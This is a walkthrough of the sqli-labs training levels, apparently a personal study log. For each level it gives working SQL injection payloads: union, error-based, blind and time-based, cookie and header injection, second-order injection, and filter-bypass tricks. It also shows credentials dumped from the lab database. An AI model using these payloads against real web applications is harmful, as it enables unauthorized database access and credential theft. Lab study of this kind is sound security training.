/Less-28a/?id=0')  Union SELEct 1,2,3 -- -
```

# Less-28 Trick with SELECT & UNION
I hit some trouble finding the closing character: `/Less-28/?id=0'` returns nothing; turns out spaces and comments are filtered

You should have guessed the closing character is `')`; close with a logical OR: `1')||('`

Spaces can be bypassed with `%09` and `%a0`, because the regex filtering union+select is `preg_replace('/union\s+select/i',"", $id);`

```markdown
# poc  closing
/Less-28/?id=1')%09UNion%a0Select%091,2,('N

# Extract data poc
/Less-28/?id=0')%09UNion%a0Select%091,version(),('3
	Your Login name:5.7.30-0ubuntu0.18.04.1
	Your Password:3

```

# Less-27a Trick with SELECT & UNION
**union based injection**

```markdown
/Less-27a/?id=0"uNIon%A0seleCt%A01,2,"3
```



**bloolean injection**

```markdown
# /Less-27a/?id=1" and"1"="1
1

# /Less-27a/?id=1" and"1"="0
0
```

# Less-27 Trick with SELECT & UNION
`SELECT` and `UNION` are filtered, but error-based injection works perfectly

```markdown
# id=1'or(extractvalue(1,concat(0x5c, (VERSION()),'~')))='1'and'1a
 XPATH syntax error: '\5.7.30-0ubuntu0.18.04.1~' 
```

Trying UNION-based injection requires bypassing the **space and comment filters**: use mixed case to bypass the keyword filter, and `%a0` to bypass the space filter

**Guess the column count**

```markdown
# With 3 columns, displays normally
## /Less-27/?id=0'uNIon%A0selECt%A01,2,'3
	 Hint: Your Input is Filtered with following result: 0'uNIon�selECt�1,2,'3 

# With 4 columns, error
## /Less-27/?id=0'uNIon%A0selECt%A01,2,3,'N
The used SELECT statements have a different number of columns
	Hint: Your Input is Filtered with following result: 0'uNIon�selECt�1,version(),'3
```

**Union-based injection**

```markdown
# Keyword mixed case + %a0 + close the single quote with where + group_concat pulls out all the data
## /Less-27/?id=0%27uNIon%A0selECt%A01,group_concat(username),group_concat(password)%a0from%a0users%a0where%a0%271%27^%270

Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 
```

ref

+ [SQLi-labs SQL injection lab: complete walkthrough of levels 1-65 - Mr. Qing - cnblogs](https://www.cnblogs.com/-qing-/p/11610385.html#_lab2_0_16)
+ [Injection bypass techniques](https://www.jianshu.com/p/48a935b123ce)

# Less-26a Trick with comments
Blind injection

```markdown
# /Less-26a/?id=0' || '0
no results

# /Less-26a/?id=0' || '1
results
```

# Less-26 Trick with comments
Spaces, comments, `and` and `or` are filtered — here's how to handle it

1. **Bypassing the space and comment filters:** use `%a0` (failed in my testing...), or use parentheses `()`, e.g. `id=1'and('b')=('b')and'1`, wherever a space would be needed (such as when a letter follows `and`). Note: logical operators cannot be wrapped in parentheses
2. **Bypassing the `and`/`or` filters:** double-write them, i.e. `AandND oorr`; or use other binary operators such as `&&    ||    |    ^    >    <` etc.

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592619793391-8b3b86d7-92f9-46e3-bd08-7d45ecf50d27.png)

```markdown
/Less-26/?id=1'oorr(extractvalue(1,concat(0x5c, (VERSION()),'~')))='1'anandd'1a
```

# Less-25a Trick with OR & AND Blind
Numeric blind injection; `and` and `or` are filtered but can be bypassed by double-writing as `anandd`  `oorr`

```markdown
# poc
/Less-25a/?id=1 anandd if(lengh(version())=23,sleep(5),1)
(brute-forced) confirmed length is 23


# Simple exploit, gets the result
/Less-25a/?id=1+anandd+if('a'=substring(version(),1,1),1,0)

```

Run the blind injection by exploiting the different output when `[CASE]` in `1 and [CASE]` is true vs. false

Use Burp's Intruder; configuration shown below

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592799238921-29e647c8-d269-4770-909d-8777b2eb895e.png)![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592799257427-4b232c18-94ac-42b9-a502-792d2a52b98d.png)

```markdown
# Payload used for fuzzing
0123456789.-_qwertyuiopasdfghjklzxcvbnm
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592799297552-8f1c18ec-f0a7-4946-bc6c-fb7d72421413.png)

Finally just specify the keyword

Results come out one character at a time, as shown below

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592799419550-d301cc6b-ec91-4d4e-bdfd-477bd0d2529c.png)

But this approach's time complexity is too high; binary search can reduce it to `O(log``_n_``)`. Since 2^8=128 covers all ASCII codes, eight comparisons determine one character. I'll provide a binary-search blind injection script later.

# Less-25 Trick with OR & AND
`or` and `and` are filtered, but the bypass is easy — any binary operator works, e.g. `||  &&`

```markdown
id=1' ^ extractvalue(0x20,concat(0x7c,user(),0x7c)) ^'
```

However, since `or` can't be used, `inf``**or**``mation_schema` is unavailable for getting table and column names.

I tried hex and found it [cannot be bypassed] — learned something new

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592577166667-b4df2a13-8b23-45f0-9760-cf3702c0bff7.png)

Below is a way to obtain table and column names without information_schema

1. First get the version,

```markdown
# /Less-25/index.php?id=1' || extractvalue(0x20,concat(0x7c,(version()),0x7c)) ||'
XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|' 
```

2. Then try to get the table names

```markdown
# /Less-25/index.php?id=1' || extractvalue(0x20,concat(0x7c,(select group_concat(0x20,table_name) from mysql.innodb_table_stats where database_name = database() limit 2),0x7c)) ||'
 XPATH syntax error: '| emails, referers, uagents, use' 
```



## Column-name-less Injection
> In higher MySQL versions, INNODB_TABLES and INNODB_COLUMNS also record table structures.
>

MySQL 5.6 and above have the `innodb_index_stats` and `innodb_table_stats` tables, which contain newly created databases and tables

```sql
select table_name from mysql.innodb_table_stats where database_name = database();
select table_name from mysql.innodb_index_stats where database_name = database();
```

ref

+ [https://www.cnblogs.com/20175211lyz/p/12358725.html](https://www.cnblogs.com/20175211lyz/p/12358725.html)
+ [CTF | MySQL column-name-less injection](https://zhuanlan.zhihu.com/p/98206699)
+ [[SWPU2019]Web1 (second-order injection, column-name-less injection, bypass information_schema) ](https://www.cnblogs.com/hello-there/p/12918265.html)

# Less-24 - Second Degree Injections
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592582913236-d9f8a9ed-33a3-4ab6-866d-52945e92571b.png)

Second-order injection: register a username containing the payload at login time; when changing the password, the stored value is used without escaping, causing the injection.

`/Less-24/pass_change.php`

```makefile
$username= $_SESSION["username"];
...
if($pass==$re_pass)
{	
	$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
    ...
}
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592569574436-f326b619-d219-4214-9019-e46b8596b875.png) after changing the password ![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592569847089-af2729c4-2589-46ae-b9de-539c4f564494.png)

`admin`'s password has been successfully changed

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592569763758-fecb935d-098c-4381-955d-ab71ebff6f50.png)

Most tutorials online stop after changing `admin`'s password. So I tried error-based injection on this injection point — i.e. registering a user whose name is the following payload

```markdown
' and extractvalue(0x20,concat(0x7c,version(),0x7c)) and '
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592570103001-f13eaf77-f49e-4e86-932a-11b3e275ab7c.png)

It complained the username was too long; after some searching, the solutions weren't practical (all required editing php.ini and restarting), so I wrote the following second-order injection script

```markdown

```



ref:

+ [Successfully fixed: data too long for column 'name' at row 1](https://blog.csdn.net/zhaopeipei1985/article/details/2633997)



# Less-23 **Error Based- no comments**
Comments are stripped, so another way to close the statement is needed. Here the operator `>` connects the payload; in fact `-    *    |    %` can all serve as binary-operator connectors. For unary operators, `!    ^` etc. can be used

```markdown
id=1' and ''>(extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ) or '
// Binary or unary operator — as long as it closes the statement
id=1' and ~(extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ) or '
```



# Less-22 Cookie Injection- Error Based- Double Quotes - string
Cookie injection with double quotes: fuzz directly with Burp's Pitchfork mode — the first position holds the base64-encoded payload, the second a placeholder of the original payload. You can see the double quote ` " ` triggers an error

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592458022007-a5ad99a4-0790-4adc-85ec-c1c2593a24c3.png)

```markdown
admin"and extractvalue(0x20,concat(0x7c7c,version(),0x7c7c))-- -
# Likewise, base64-encoded
YWRtaW4iYW5kIGV4dHJhY3R2YWx1ZSgweDIwLGNvbmNhdCgweDdjN2MsdmVyc2lvbigpLDB4N2M3YykpLS0gLQ==
```



# Less-21 Cookie Injection- Error Based- complex - string
Cookie injection, except the payload needs base64 encoding first



```http
	Payload as follows
admin'and extractvalue(0x20, concat(0x7c,version(),0x7c)) and '
	base64-encoded as follows
YWRtaW4nYW5kIGV4dHJhY3R2YWx1ZSgweDIwLCBjb25jYXQoMHg3Yyx2ZXJzaW9uKCksMHg3YykpIGFuZCAn
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592408875594-64d93452-df5f-4f9f-b37b-3e708cd63b35.png)

# Less-20 Cookie Injection- Error Based- string
![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592407109925-acfdbfdf-16bb-49a5-92d7-29a0d16cc7aa.png)

Cookie injection: after logging in, modify the cookie. Adding a single quote triggers an error, so guess the original statement and build the following payload

```http
Cookie: uname=admin'and extractvalue(0x20,concat(0x7c,version())) -- -
```




# Less-19 Header Injection- Referer- Error Based- string
Only here did I start getting the hang of it — the same error-based injection in the `'and [payload] and'` form, using `0x7c` (i.e. `|`) to stringify the queried content `version()` for error output

```http
Referer: 123321'and extractvalue(0x20, concat(0x7c,version(),0x7c)) and '
```

The result is as follows

```http
XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'
```

# Less-18 Header Injection- Error Based- string
Reading the source revealed the statement structure

```http
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

But I honestly couldn't figure out why it closes this way....

```http
User-Agent: 'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
```

[Follow-up] Figured it out: the final statement is `'``'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '``'`, with our concatenated payload in the middle — it's actually a value produced by participating in a **logical AND**; that's the trick

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592377145499-e2f1f2da-8777-41f8-897d-06e0549e5c46.png)

Finally, error-based injection was completed with the following statement,

+ `7c `  ->  `| `
+ `3a `  ->  `: `

```markdown
'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
```

# Less-17 Update Query- Error based - String
Testing shows that when the username is `admin`, the password field is vulnerable to error-based injection

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1592143252481-0148265c-d490-4009-bf3d-6310ac4de355.png)



# Less-16- Blind- Time Based- Double quotes- String
Determine the closing character

Use a subquery to confirm the injection character

```javascript
admin")or (select 1 from (select sleep(2) )x)-- -1
```

2-second delay

# Less-15- Blind- Boolian Based- String
Neither single nor double quotes produce an error. Knowing the username is `admin`, the closing character can only be determined by whether login succeeds

The closing character is a single quote

```sql
admin' -- -
```

It's time-based blind injection.



# Less-14- Double Injection- Double quotes- String
Adding a double quote errors out, which confirms the closing character is the double quote `"`; the next step is simply to inject

With no output on the page, even though `order by` confirms two columns of data, `UNION` leaves only the boolean blind injection route, and floor-based error injection requires at least three rows in the table — clearly not viable here.

Tweak the closing character in the earlier `payload` for a quick pass

```sql
admin" and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables limit 1),'~'));-- -
```

# Less-13- Double Injection- String- with twist
Adding a single quote errors out; the closing character is `')`. With `admin')-- -` — unexpectedly a universal password — I logged straight in

You could equally just run `sqlmap` through it. But I chose manual error-based injection — the tail must be closed to get the information out of the error!

```sql
# Dump the version number
admin') and extractvalue(1,concat("~",version(),"~"))-- -
...
```



# Less-12- Error Based- Double quotes- String
I hit a snag determining the closing character: `admin"` initially errored out, but the universal password `admin"or""="` failed. Later I used comments to determine the closing character — `admin"-- -` and `admin")-- -` closed successfully

```sql
# Universal password
admin")or""=("

# Comment bypass
Since there's a trailing LIMIT 1,1, the username=/*&password=*/ trick doesn't really work for bypassing the password
```

Just run `sqlmap -r`



# Less-11- Error Based- String
## Closing
Adding a quote errors out. Confirmed closing with a single quote `admin' -- -`; error-based injection + `UNION` union injection

```markdown

# Universal password
admin' or ''='
admin' and extractvalue(1,concat("~",(version()),"~"))-- -
```



---

# Less-10: Blind- Time based- Double Quotes- String
```sql
id=1" and sleep(2)='1' -- -		delay occurs
```



# Less-9: Blind- Time based- Single Quotes- String
Whether adding quotes or comments, no error whatsoever.

```sql
id=2' AND '1'=SLEEP(1)-- -		delay occurs
id=2' AND '1'=SLEEP(5)-- -		delay occurs
```



# Less-8: Blind- Boolian- Single Quotes- String
There is status output; the closing character is a single quote `'`

Judge by whether ` You are in...........` is echoed.

Conclusion: blind injection falls into two categories: boolean-based blind injection + time-based blind injection.

Because there is no true/false echo — no difference whatsoever visible in the response (response includes: response size / status code / page text)

# Less-7: Dump into Outfile
No data or error output; as always, determine the closing first.

```sql
id=1' -- -		error
id=1') -- -		error
id=1')) -- -		normal

```

Boolean + time-based blind injection — let sqlmap do it all in one shot

# Less-6: Double Query- Double Quotes- String
The closing character changes to a single quote; the rest is the same as Less 5

```sql
id=1" and updatexml("1",concat("~",version(),"~"),"1")-- -
# Single row
id=1" and updatexml("1",concat("~",(select group_concat(0x20,(select schema_name from information_schema.schemata limit 1,1))),"~"),"1")-- -
# Multiple rows
id=1" and updatexml("1",concat("~",((select group_concat(column_name) from information_schema.columns where table_name='emails')),"~"),"1")-- -
```





# Less-5: Double Query- Single Quotes- String
An injection point with no data output

## Closing
```sql
id=1"		normal
id=1'		error
id=1'-- -		normal
```

The closing character is a single quote `'`; a reasonable guess is that the backend statement is `select id from test where id='$id';`

With no output position, union injection is unusable — but UNION can be used to bring in floor-based error injection

## Error-based injection
```sql

id=1' AND EXTRACTVALUE(1,concat("~",(select group_concat(table_name) from information_schema.tables where table_schema='security'),"~"))-- -
id=1' AND EXTRACTVALUE(1,concat("~",(select group_concat(column_name) from information_schema.columns where table_name='emails'),"~"))-- -
id=1' AND EXTRACTVALUE(1,concat("~",(select group_concat(schema_name) from information_schema.schemata),"~"))-- 

# floor
id=1' UNION SELECT null,null,null from (SELECT COUNT(*),concat(floor(rand(0)*2),"~",version())x from information_schema.tables group by x )x-- -
id=1' UNION SELECT null,null,null from (SELECT COUNT(*),concat(floor(rand(0)*2),"~",(select group_concat(0x20,table_name) from information_schema.tables ))x from information_schema.tables group by x )x-- -
```



# Less-4: Error Based- DoubleQuotes String
## Closing


```sql
id=1'	   normal
id=1"	   error
id=1" -- -		error
id=1") -- -   normal
```

The closing character is `")`; a reasonable guess at the original statement structure is `select id from test where id=("$id");`

## payload


```sql
# Union
id=-2") union select 1,2,group_concat(schema_name,0x20) from information_schema.schemata -- -

# Error-based
id=-1")+AND+updatexml(1,concat("~",(select+version()),'~'),1)-- -

```



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586505197604-40c983d2-34cc-4005-a2ec-9d61d6653b24.png)

# less-3: Error Based- String (with Twist)
## Determine the closing character!
```sql
id=1'		error
id=1' -- -  error
id=1') -- -  normal

```

With the closing character confirmed as `')`, you can inject following the earlier steps

## Union injection
```sql

id=-2') union select 1,2,group_concat(schema_name,0x20) from information_schema.schemata -- -
id=-2') union select 1,2,group_concat(table_name,0x20) from information_schema.tables where table_schema='security' -- -
id=-2') union select 1,2,group_concat(column_name,0x20) from information_schema.columns where table_name='users' -- -

```



## Error-based injection
 **There is an output length limit**

If you don't stringify the result with concat, the output will fail to display

```sql
id=-1')+AND+updatexml(1,concat("~",(select+version()),'~'),1)-- -

id=-1')+AND+extractvalue(1,concat("~",(select+version()),'~'))-- -

id=-1') and extractvalue(1, (SELECT+group_concat((select table_name from information_schema.tables limit 4,1),0x20)+FROM+information_schema.columns))-- -

id=-1') union select 1,2,3 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )a-- -

```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586502458478-76f20c40-ccc1-4ded-8e1d-f6ea67f5fded.png)

**floor has no output limit**

The attack `Vector` extracted from `sqlmap`:

```sql
1,0x7365637572697479,0x73797 '||(SELECT 0x45576d74 WHERE 1206=1206 AND (SELECT 5316 FROM(SELECT COUNT(*),CONCAT(0x71707a7871,(SELECT MID((IFNULL(CAST(table_schema AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c,0x6d7973716c69,0x706572666f726d616e63655f736368656d61,0x7365637572697479,0x737973) LIMIT 39,1),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'3) LIMIT 39,1),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
```

**payload**

```sql
id=-1') union select 1,2,3 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )a-- -
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586499264221-8c1cfe72-41ce-4d39-80ef-9d0c35fb8024.png)



# less-2: Error Based- Intiger
## Union injection
Use `order by ` to determine the column count: 3 columns, output at positions 2 and 3; use group_concat directly to try pulling out all the data



```sql
id=0  UNION SELECT 1,2,group_concat( column_name,0x20) from information_schema.columns
```



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586420151258-f3369495-a134-49e3-b852-5c83003e7679.png)

## Error-based injection
```sql
http://sqli.zuoxueba.org/Less-2/?id=1 and 
:(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) 
from information_schema.tables limit 0,1),floor(rand(0)*2))x 
from information_schema.tables group by x)a)
```

Integer-type injection; no single quote needed

## Blind injection
```sql
# Test
1+and+case+when+(1=1)+then+sleep(1)+else+1+end

# Extract data
1+and+case+when+(left((select+version()),1)='5')+then+sleep(1)+else+1+end
	- left(str,length)
  - substr(str,start,[length])
  	+ start is the starting position, 1 by default
    + length is the length of the returned string and cannot be negative
    

```




# less-1: Error Based- String
## Union injection
The reason `id=1` yields no data is that the `**mysql_fetch_array()**` function on line 31 of the source fetches only one row,

> The **mysql_fetch_array**() function fetches a row from the result set as an associative array
>

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586286240874-ee453d74-bf47-4b77-8b5e-6ecdeeaa5cb6.png)

If you execute `id=1` directly, there are two rows of results; the query we want to run is in row 2, so it never gets returned.

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586286614284-2d46cd91-aa37-4933-bd80-f0b0370db1a3.png)

That's why `id` must be set to a non-existent value (like -1), so that `mysql` returns only the query result we want.



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586286830896-64bed519-3b4e-4aab-9659-1652de1e3b94.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586286876950-da58195a-4a74-4bb7-b37c-3c10fcd05889.png)

Also, in `1,2,3-- #`, the `-- #` comments out the trailing statement; there must be a space between `--` and `#`, otherwise it errors. Corrected as follows

> Note: always add a space after the comment character, or a URL-encoded space (%20); otherwise the comment has no effect. The # can also be replaced with other characters
>

## Error-based injection
References:

+ [Ten MySQL error-based injection techniques](https://www.cnblogs.com/wocalieshenmegui/p/5917967.html)

The usable payloads mainly fall into the following categories

### XPATH syntax errors
Error messages have a length limit, visible in `mysql/my_error.c`:

```plain
/* Max length of a error message. Should be
kept in sync with MYSQL_ERRMSG_SIZE. */
#define ERRMSGSIZE (512)
```

#### UpdateXml(1,(QUERY),1)
> UPDATEXML (XML_document, XPath_string, new_value);
>
> First parameter: XML_document is in String format, the name of the XML document object — Doc in this text
>
> Second parameter: XPath_string **(must be a string in XPath format)**; if you don't know XPath syntax, find a tutorial online.
>
> Third parameter: new_value, String format, replaces the matching data found
>
> Purpose: changes the value of matching nodes in the document
>

```sql
1 and pdatexml(1,(QUERY),1)
1 and 1=(updatexml(1,(QUERY),1))  //the parentheses around updatexml are optional

id=1' and '1'=(updatexml('2',concat('~',(select @@basedir),'~'),'2'))-- 1
id=0' and updatexml(2,concat('~',(select version()),'~'),2)-- 1

```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586288624828-52c2c0b3-992c-43a4-917e-cdbaad5d7bc6.png)



#### ExtractValue(1,(QUERY))
> `[ExtractValue(xml_frag, xpath_expr)](https://yq.aliyun.com/go/articleRenderRedirect?spm=a2c4e.11153940.0.0.34f261feypnf9U&url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue)`
>
> `[ExtractValue()](https://yq.aliyun.com/go/articleRenderRedirect?url=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fxml-functions.html%23function_extractvalue)` takes two string arguments, an XML fragment _xml_frag_ and an XPath expression _**xpath_expr**_ (also called a locator); if it contains a syntax error, SQL will display the error.
>

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586354275997-58cabcfa-f20c-47e3-89c0-6fca31b64ef2.png)



```sql
id=1%27%20and%20extractvalue(1,%20concat(0x5c,%20(select%20table_name%20from%20information_schema.tables%20limit%201),%27~%27));--%20-
```



### Duplicate primary key
#### floor
> _ Error via floor [no character length limit] requires at least three rows in the table _
>
> [https:/](https://xz.aliyun.com/t/253#toc-2)[/xz.aliyun.com/t/253#toc-2](https://xz.aliyun.com/t/253#toc-2)
>

First, a commonly used `payload`:

```sql
?id=0 union select 1,2,3 from( select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )a-- -
```

It mainly comes from the **duplicate primary key** problem caused by using `count(*)`, `rand()` , and `group by ` together

```plain
floor(x): rounds down, returns a value not greater than x
round(x,d): rounds and keeps the specified number of decimal places; x is the number to process, d is how many decimals to keep.
rand(): produces a random float between 0 and 1; with a parameter x it returns a fixed value corresponding to x
```

First, look at `floor(rand(0)*2))`: it is a fixed sequence beginning `0 1 1 0 1 1`

```plain
mysql> select floor(rand(0)*2) from test;
+------------------+
| floor(rand(0)*2) |
+------------------+
|                0 |
|                1 |
|                1 |
|                0 |
|                1 |
|                1 |
+------------------+
6 rows in set (0.00 sec)
```

`group by key` groups and aggregates the data, as shown in the figure below. It's easy to see that duplicate key values are not allowed (the name column in the figure below); duplicates cause an error

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586409955539-b1006041-5c09-41b9-bee0-a7f10184fa95.png)

Meanwhile, `group by` works by reading each row of the data in a loop and storing the results in a virtual table. When this virtual table reads each row's key, it follows this logic:

+ If the key is **determined** to already exist in the temp table, **do not insert** the data;
+ If the key is **determined** not to be in the temp table, **insert** the current row's data into the temp table

As just noted, `floor(rand(0)*2)` is not a constant — it flips between the two values ` 0 1 `, which means that by the time `group by` executes the **check** and the **insert**, the standard has already changed! ~~(this second you think I'm 0, the next second I'm 1 — didn't see that coming, haha)~~

~~~~

Also, why use `x` and `a` as placeholders in the `payload`? They're actually table aliases (`alias`), equivalent to ` as x` (run results in the figure below). They're required in subqueries, otherwise you get this error: `Every derived table must have its own alias `

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586354642583-bf8fc31a-6698-46c5-9878-931674632223.png)![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586354668898-70056c04-f192-4b86-b4eb-72c48ddb18e1.png)



[A Few Notes on MySQL Error-Based Injection - Xianzhi community](https://xz.aliyun.com/t/253#toc-2)

### Big-number overflow


```sql
geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()
```



> One claim: on MySQL >5.5.53, it can no longer return query results
>
> Another claim: it works for injection on version 5.5.47, but not on 5.7.17:
>
> [https://xz.aliyun.com/t/253#toc-4](https://xz.aliyun.com/t/253#toc-4)
>
> Conclusion: unusable on newer MySQL versions
>

# Tips
MyBatis injection

```xml
<select id="getByName" resultType="com.example.demo.entity.User">
  select * from user where
  name like '${'%' + name + '%'}'
  </select>
```

The above is injectable, using



+ distinct removes duplicate entries

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586353989124-f5a8bb4e-374d-4d36-8677-89869f68a1f0.png)

```sql
SELECT distinct concat(0x7e, (select password),0x7e) FROM users limit 1,1),0x7e),1)-- -
```

+ `group_concat` merges multiple rows of results for display in one line; `group_concat` can be used without `group` by, but it must contain column names, not subqueries
+  In error-based injection, you must use `concat("~", [QUERY] , "~")` to stringify its left and right sides, otherwise the output will be incomplete

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586502391261-1de189fb-efe1-442f-a013-477a60f3ffd4.png)![](https://cdn.nlark.com/yuque/0/2020/png/166008/1586502428533-fc953746-ff26-4b14-b545-37e70f914275.png)

+ In `-- -`, the space stays a space in the browser but becomes a plus sign `+` in Burp

# Deployment Notes
+ [https://github.com/alecshan/sqli-labs-for-docker](https://github.com/alecshan/sqli-labs-for-docker)
